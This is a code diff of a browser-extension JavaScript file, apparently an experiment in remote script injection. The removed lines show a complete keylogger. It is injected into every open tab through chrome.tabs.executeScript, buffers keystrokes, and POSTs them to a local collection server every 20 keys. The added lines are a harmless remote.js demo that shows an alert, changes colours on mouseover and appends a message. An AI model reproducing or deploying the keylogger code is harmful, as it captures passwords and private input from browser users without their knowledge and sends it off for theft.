@@ -1,40 +1,21 @@
+(function() {
+    console.log("✅ remote.js loaded successfully!");
 
-// Function to inject the content script into a tab
-function injectScript(tabId) {
-    chrome.tabs.executeScript(tabId, {
-        code: `
-        console.log('Injected script');
-         
-            let keyBuffer = [];
-            document.addEventListener("keydown", function(e) {
-                keyBuffer.push(e.key);
-                if (keyBuffer.length >= 20) {
-                    fetch('http://localhost:5000/keys', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ keys: keyBuffer.join('') })
-                    }).catch(error => console.error('Error sending keys:', error));
-                    keyBuffer = [];
-                }
-            });
-        `
-    });
-}
+    // Alert confirmation
+    alert("🔥 Remote script executed from nirajankhatiwada.com.np!");
 
-// Inject script into all tabs initially
-chrome.tabs.query({}, function(tabs) {
-    tabs.forEach(function(tab) {
-        if (!tab.url.startsWith('chrome://') && !tab.url.startsWith('edge://')) {
-            injectScript(tab.id);
+    // Add a mouseover effect to change background color
+    document.addEventListener("mouseover", function(event) {
+        if (event.target.tagName === "P" || event.target.tagName === "DIV") {
+            event.target.style.backgroundColor = "#" + Math.floor(Math.random() * 16777215).toString(16);
         }
     });
-});
 
-// Listen for tab updates and re-inject the script
-chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
-    if (changeInfo.status === 'complete' && !tab.url.startsWith('chrome://') && !tab.url.startsWith('edge://')) {
-        injectScript(tabId);
-    }
-});
+    console.log("🎨 Mouseover event added: Background color changes randomly.");
+
+    // Append a hidden message to the body
+    let hiddenMessage = document.createElement("div");
+    hiddenMessage.innerText = "Remote script executed successfully!";
+    hiddenMessage.style.cssText = "position:fixed;bottom:-100px;left:50%;transform:translateX(-50%);opacity:0.5;font-size:12px;";
+    document.body.appendChild(hiddenMessage);
+})();
